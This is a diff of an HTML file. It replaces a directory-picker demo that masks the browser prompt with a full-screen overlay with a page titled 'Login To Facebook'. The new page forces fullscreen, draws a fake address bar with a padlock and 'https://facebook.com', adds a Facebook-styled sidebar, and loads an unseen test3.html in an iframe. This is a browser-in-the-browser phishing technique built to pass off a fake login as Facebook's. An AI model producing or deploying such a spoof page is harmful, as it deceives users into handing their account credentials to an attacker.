@@ -1,116 +1,142 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Directory Picker Overlay</title>
+  <title>Login To Facebook</title>
   <style>
-    body {
-      font-family: sans-serif;
-      background: #f5f5f5;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+    html, body {
       margin: 0;
-    }
-
-    button {
-      padding: 15px 25px;
-      font-size: 18px;
-      border: none;
-      background: #0078ff;
-      color: white;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-
-    button:hover {
-      background: #005fcc;
-    }
-
-    ul {
-      margin-top: 20px;
-      list-style: none;
       padding: 0;
-      background: #fff;
-      border-radius: 10px;
-      padding: 15px;
-      box-shadow: 0 3px 8px rgba(0,0,0,0.1);
-      width: 80%;
-      max-width: 500px;
-      overflow: auto;
-      max-height: 300px;
+      overflow: hidden;
+      font-family: sans-serif;
+      background: #ffffff;
     }
-
-    /* Overlay penuh layar */
-    #overlay {
+    .addressbar-spoof {
       position: fixed;
       top: 0;
       left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0, 123, 255, 0.85);
+      height: 40px;
+      width: 100%;
+      background: #f1f1f1;
       display: flex;
       align-items: center;
-      justify-content: center;
-      color: white;
-      font-size: 28px;
-      font-weight: bold;
+      padding-left: 10px;
+      font-size: 14px;
       z-index: 9999;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s ease;
     }
-
-    #overlay.show {
-      opacity: 1;
-      pointer-events: all;
+    .secure {
+      color: green;
+      font-weight: bold;
+      margin-right: 6px;
+    }
+    iframe {
+      position: absolute;
+      top: 40px;
+      left: 0;
+      width: 100%;
+      height: calc(100% - 40px);
+      border: none;
+    }
+    #trigger {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 18px;
+      padding: 20px;
+      background: #111;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    
+    /* Sidebar styling */
+    .sidebar {
+      position: fixed;
+      top: 40px;
+      left: 0;
+      width: 200px;
+      height: calc(100% - 40px);
+      background-color: #f0f2f5;
+      padding: 20px;
+      box-sizing: border-box;
+      display: none;
+      z-index: 9998;
+      overflow-y: auto;
+    }
+    
+    .sidebar img {
+      width: 100%;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .sidebar-content {
+      margin-top: 20px;
+    }
+    
+    .sidebar-content h3 {
+      margin: 0 0 10px 0;
+      color: #1c1e21;
+      font-size: 16px;
+    }
+    
+    .sidebar-content p {
+      margin: 0;
+      color: #65676b;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+    
+    /* Adjust iframe when sidebar is visible */
+    .sidebar-visible + iframe {
+      left: 200px;
+      width: calc(100% - 200px);
     }
   </style>
 </head>
 <body>
-  <h2>Pilih Folder Anda</h2>
-  <button id="pickFolder">Show Directory Picker</button>
 
-  <ul id="fileList"></ul>
+<button id="trigger">CLICK TO OPEN FACEBOOK</button>
 
-  <div id="overlay">Loading...</div>
+<script>
+  const trigger = document.getElementById("trigger");
 
-  <script>
-    const pickButton = document.getElementById('pickFolder');
-    const overlay = document.getElementById('overlay');
-    const fileList = document.getElementById('fileList');
-
-    pickButton.addEventListener('click', async () => {
-      try {
-        // Tampilkan overlay penuh
-        overlay.classList.add('show');
-
-        // Tunggu sedikit agar overlay sempat muncul
-        await new Promise(resolve => setTimeout(resolve, 600));
-
-        // Panggil file picker
-        const dirHandle = await window.showDirectoryPicker();
-
-        // Sembunyikan overlay setelah user memilih folder
-        overlay.classList.remove('show');
-
-        fileList.innerHTML = `<li><b>📁 Folder:</b> ${dirHandle.name}</li>`;
-
-        for await (const [name, handle] of dirHandle.entries()) {
-          const icon = handle.kind === 'file' ? '📄' : '📁';
-          const li = document.createElement('li');
-          li.textContent = `${icon} ${name}`;
-          fileList.appendChild(li);
-        }
-      } catch (err) {
-        overlay.classList.remove('show');
-        console.error(err);
+  trigger.onclick = () => {
+    document.body.innerHTML = `
+      <div class="addressbar-spoof">
+        <span class="secure">🔒</span> https://facebook.com
+      </div>
+      <div class="sidebar">
+        <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=774&q=80" alt="Social Connection">
+        <div class="sidebar-content">
+          <h3>Stay Connected</h3>
+          <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+      </div>
+      <iframe src="test3.html"></iframe>
+    `;
+    
+    // Request fullscreen and show sidebar
+    document.documentElement.requestFullscreen().then(() => {
+      // Show sidebar only in fullscreen mode
+      document.querySelector('.sidebar').style.display = 'block';
+      document.querySelector('.sidebar').classList.add('sidebar-visible');
+    }).catch(console.error);
+    
+    // Listen for fullscreen exit to hide sidebar
+    document.addEventListener('fullscreenchange', () => {
+      const sidebar = document.querySelector('.sidebar');
+      if (!document.fullscreenElement) {
+        sidebar.style.display = 'none';
+        sidebar.classList.remove('sidebar-visible');
+      } else {
+        sidebar.style.display = 'block';
+        sidebar.classList.add('sidebar-visible');
       }
     });
-  </script>
+  };
+</script>
+
 </body>
 </html>
